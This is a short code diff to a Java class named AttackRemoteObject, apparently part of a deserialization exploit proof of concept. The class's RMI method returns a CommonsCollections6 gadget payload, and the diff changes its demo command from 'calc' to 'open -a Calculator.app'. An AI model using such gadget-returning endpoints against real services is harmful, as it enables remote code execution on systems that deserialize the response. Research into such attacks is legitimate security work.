@@ -14,6 +14,6 @@ public class AttackRemoteObject extends UnicastRemoteObject implements AttackRem
 
     @Override
     public Object sayHello() throws Exception {
-        return Serializer.cc6("calc");
+        return Serializer.cc6("open -a Calculator.app");
     }
 }
